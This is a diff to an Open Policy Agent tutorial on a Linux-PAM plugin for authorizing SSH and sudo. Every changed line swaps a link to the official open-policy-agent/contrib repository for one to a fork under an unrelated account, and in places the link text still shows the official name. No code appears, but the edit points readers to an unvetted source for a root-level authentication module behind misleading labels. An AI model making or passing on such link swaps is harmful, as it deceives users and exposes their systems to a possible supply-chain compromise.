@@ -14,7 +14,7 @@ host-level access controls over SSH and sudo.
 Linux-PAM can be configured to delegate authorization decisions to plugins
 (shared libraries). In this case, we have created an OPA-based plugin that can
 be configured to authorize SSH and sudo access. The OPA-based Linux-PAM plugin
-used in this tutorial can be found at [open-policy-agent/contrib](https://github.com/open-policy-agent/contrib/tree/main/pam_opa).
+used in this tutorial can be found at [open-policy-agent/contrib](https://github.com/IUAD1IY7/contrib/tree/main/pam_opa).
 
 For this tutorial, our desired policy is:
 
@@ -126,7 +126,7 @@ cd bundles
 ```
 
 Next, create a policy that will tell the PAM module to collect context that is required for authorization.
-For more details on what this policy should look like, see [this documentation](https://github.com/open-policy-agent/contrib/tree/main/pam_opa/pam#pull).
+For more details on what this policy should look like, see [this documentation](https://github.com/IUAD1IY7/contrib/tree/main/pam_opa/pam#pull).
 
 **pull.rego**:
 
@@ -143,7 +143,7 @@ env_vars := []
 Create the policies that will authorize SSH and sudo requests.
 The `input` which makes up the authorization context in the policy below will also
 include some default values, such as the username making the request. See
-[this documentation](https://github.com/open-policy-agent/contrib/tree/main/pam_opa/pam#authz)
+[this documentation](https://github.com/IUAD1IY7/contrib/tree/main/pam_opa/pam#authz)
 to get a better understanding of what the `input` to the authorization policy will look like.
 
 Unlike the _pull_ policy, we'll create separate _authz_ policies
@@ -287,7 +287,7 @@ You will see a lot of verbose logs from `sudo` as the PAM module goes through th
 This is intended so you can study how the PAM module works.
 You can disable verbose logging by changing the `log_level` argument in the PAM
 configuration. For more details see
-[this documentation](https://github.com/open-policy-agent/contrib/tree/main/pam_opa/pam#configuration).
+[this documentation](https://github.com/IUAD1IY7/contrib/tree/main/pam_opa/pam#configuration).
 
 ### 4. SSH as a user without the `admin` role.
 
@@ -434,5 +434,5 @@ You learned a number of things about SSH with OPA:
 - Importing external data into OPA and writing policies that depend on that data.
 
 The code for the PAM module used in this tutorial can be found in the
-[open-policy-agent/contrib](https://github.com/open-policy-agent/contrib)
+[open-policy-agent/contrib](https://github.com/IUAD1IY7/contrib)
 repository.
